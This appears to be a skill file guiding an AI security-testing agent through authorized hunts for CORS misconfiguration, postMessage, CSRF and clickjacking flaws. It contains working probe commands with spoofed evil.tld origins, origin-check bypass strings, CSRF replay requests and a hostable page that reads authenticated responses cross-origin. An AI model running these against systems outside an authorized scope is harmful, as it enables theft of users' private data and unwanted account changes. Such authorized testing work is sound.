---
name: zp-cors
description: ZeroProtocol hunter for CORS misconfiguration, cross-origin data theft and related client-side trust failures including postMessage, clickjacking and CSRF. Use when any Access-Control-Allow-* header appears, when testing whether another origin can read authenticated responses, when checking origin reflection or null origin, when auditing a postMessage handler, or when evaluating CSRF protection. A permissive CORS header is only a finding when it exposes data that a session actually protects.
---

# zp-cors - who else can read this

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0. Exit 1 refuse ·
3 stop · 4 stop.

The bar that most CORS reports fail: `Access-Control-Allow-Origin: *` on a **public** endpoint is
not a vulnerability. It is a finding only when a **permissive origin** meets
`Allow-Credentials: true` (or a token the attacker's page can read) on a response containing data
the session protects. Check all three before writing anything.

---

## Procedure

**1. Run the origin matrix.** Each variant tests a different flaw in the allow-list logic.

```bash
EP="https://$H/api/me"
for o in "https://evil.tld" \
         "null" \
         "https://$H.evil.tld" \
         "https://evil$H" \
         "https://$H-evil.tld" \
         "http://$H" \
         "https://sub.$H" \
         "https://evil.tld%60.$H" \
         "https://$H%23.evil.tld" \
         "https://$H.evil.tld:443"; do
  printf '%-40s ' "$o"
  curl -sk -I "$EP" -H "Origin: $o" -H "Cookie: session=$TOK_A" \
    | grep -i 'access-control-allow' | tr '\n' ' '; echo
done
```

| Response | Reading |
|---|---|
| `Allow-Origin: <your origin>` + `Allow-Credentials: true` | **confirmed.** Full cross-origin read of authenticated data |
| `Allow-Origin: *` + `Allow-Credentials: true` | browsers reject this combination - **not exploitable** |
| `Allow-Origin: *`, no credentials, authenticated data | only exploitable if auth is a *header* the attacker can supply, or the data is not really private |
| `Allow-Origin: null` accepted | exploitable from a sandboxed iframe or a `data:` URL |
| `Allow-Origin: http://$H` (scheme downgrade) | exploitable on a network path, or via a mixed-content sibling |
| `Allow-Origin: https://sub.$H` where you control `sub` | chain with `zp-takeover` or an XSS on that subdomain |
| header absent | same-origin policy holds. Killed |

The suffix/prefix variants (`$H.evil.tld`, `evil$H`) catch the two most common regex mistakes:
matching the domain anywhere in the origin instead of anchoring it.

**2. Establish that the endpoint actually holds protected data.**

```bash
curl -sk "$EP"                             | head -c 200   # anonymous
curl -sk "$EP" -H "Cookie: session=$TOK_A" | head -c 200   # authenticated
```

If both return the same thing, the CORS header exposes nothing and there is no finding. This
single check kills most CORS reports before they are written - do it first.

**3. Prove it with a real page** (`zp-browser` drives the headless engine). A `curl` header dump is not proof of cross-origin read; browsers
enforce CORS, so the browser must be the witness.

```html
<!-- host on your own domain; open it while logged in to the target -->
<!DOCTYPE html><meta charset="utf-8">
<h3>ZeroProtocol CORS PoC - canary 91234</h3><pre id="o">…</pre>
<script>
fetch("https://TARGET/api/me", { credentials: "include" })
  .then(r => r.text())
  .then(t => { document.getElementById("o").textContent = t.slice(0, 800); })
  .catch(e => { document.getElementById("o").textContent = "blocked: " + e; });
</script>
```

Screenshot your own domain in the address bar with the target's authenticated data rendered on it.
That is the finding, and it is unambiguous. **Read your own account's data only** - never a real
user's.

**4. Check the preflight separately.** Servers often behave differently on `OPTIONS`.

```bash
curl -sk -X OPTIONS "$EP" -H "Origin: https://evil.tld" \
  -H 'Access-Control-Request-Method: PUT' \
  -H 'Access-Control-Request-Headers: authorization,content-type,x-custom' -D - -o /dev/null \
  | grep -i 'access-control'
```

`Allow-Methods` including `PUT`/`DELETE` plus a reflected origin means cross-origin **writes**,
which is worse than reads. `Allow-Headers: *` or `authorization` widens it further.

**5. postMessage - the other cross-origin trust boundary.**

```bash
grep -nE 'addEventListener\(\s*["'\'']message|onmessage\s*=' js/*.js
grep -nE '\.origin\s*(===?|!==?)|origin\.(indexOf|includes|startsWith|match)|\.source\s*===?' js/*.js
grep -nE 'postMessage\([^,]+,\s*["'\'']\*["'\'']' js/*.js      # sending to * leaks data
```

| Pattern | Verdict |
|---|---|
| no `origin` check in the handler | **confirmed.** Any page can drive it |
| `origin.indexOf("target.com") > -1` | bypassed by `https://target.com.evil.tld` |
| `origin.endsWith("target.com")` | bypassed by `https://eviltarget.com` |
| `postMessage(data, "*")` with sensitive data | leak to any embedding frame |
| strict `===` against a constant | correct. Killed |

The handler's sink decides severity: `innerHTML` is XSS (`zp-xss`), `location=` is open redirect,
a token echoed back is credential theft.

**6. CSRF - check what actually protects the state-changing request.**

```bash
# does it work with the token removed?
curl -sk -X POST "https://$H/api/settings" -H "Cookie: session=$TOK_A" \
  -H 'Content-Type: application/json' -d '{"email":"zp@example.com"}' -o /dev/null -w '%{http_code}\n'
# and as a simple, form-encodable request (no preflight, so a cross-site form works)?
curl -sk -X POST "https://$H/api/settings" -H "Cookie: session=$TOK_A" \
  -H 'Content-Type: application/x-www-form-urlencoded' -d 'email=zp@example.com' -o /dev/null -w '%{http_code}\n'
curl -skI "https://$H/" | grep -io 'samesite=[a-z]*'
```

Modern `SameSite=Lax` defaults kill most classic CSRF. A real CSRF finding today usually needs:
a `SameSite=None` cookie, or a `GET`-based state change, or a form-encodable POST with no token,
or a token that is not actually validated. Check `SameSite` before you write the report.

**7. Clickjacking** - only report it with a real, sensitive action behind it.

```bash
curl -skI "https://$H/settings" | grep -iE 'x-frame-options|content-security-policy' \
  || echo "no framing protection"
```

Missing `X-Frame-Options`/`frame-ancestors` on a marketing page is noise. On a one-click
"delete account", "approve payment" or "grant access" flow it is a finding - and you need a PoC
page showing the overlay.

---

## Confirm or kill

| Situation | Verdict |
|---|---|
| origin reflected + credentials true + private data | **confirmed cross-origin data theft.** High |
| `null` origin allowed + credentials true | confirmed; PoC from a sandboxed iframe |
| `*` + credentials true | not exploitable - the browser blocks it. Killed |
| `*` on genuinely public data | **not a finding.** Killed |
| permissive CORS on an endpoint requiring an `Authorization` header the attacker lacks | not exploitable. Killed |
| allowed subdomain you can control | confirmed **as a chain** with takeover or XSS there |
| preflight allows `PUT`/`DELETE` from any origin | confirmed cross-origin write. Higher than read |
| `message` handler with no origin check and a dangerous sink | confirmed. Severity from the sink |
| CSRF with `SameSite=Lax` and a JSON-only endpoint | almost certainly killed. Verify before claiming |
| clickjacking on a page with no sensitive action | killed |

---

## High-value patterns

- **`/api/me`, `/api/account`, `/api/keys`** with reflected origin and credentials - direct PII or credential theft.
- **An allow-list including a subdomain you can take over** - chain with `zp-takeover`.
- **`Origin: null` accepted** - trivially reachable from a sandboxed iframe, frequently overlooked.
- **A wildcard on an internal or admin API** that authenticates by cookie.
- **`postMessage` handler with a substring origin check** and an `innerHTML` sink - DOM XSS from any page.
- **Cross-origin `DELETE` allowed** by an over-broad preflight.
- **A `GET` endpoint that changes state** plus no framing protection - clickjacking with real impact.

---

## Pitfalls

- **Reporting `*` on a public endpoint.** The most common junk CORS report there is.
- **Reporting `*` with `Allow-Credentials: true`** as exploitable. Browsers refuse that pair.
- **Not checking whether the data is private.** Compare anonymous and authenticated first.
- **A curl header dump as the PoC.** Browsers enforce CORS; show a browser.
- **Reading a real user's data** in your PoC. Your own account, always.
- **Ignoring `SameSite`** and filing a CSRF that cannot happen.
- **Clickjacking reports on static pages.**
- **Missing the preflight** and therefore missing cross-origin writes.
- **Not testing the suffix/prefix origin variants** - those are the bugs, not the literal `evil.tld`.

---

## Hand off to

Confirmed data theft -> `zp-triage`, `zp-report` with the browser PoC.
`postMessage` sinks -> `zp-xss`. Allowed subdomain -> `zp-takeover`.
Cross-origin writes -> `zp-authz`, `zp-idor`. Cacheable CORS responses -> `zp-cache-poison`.
Token handling -> `zp-jwt-oauth`.
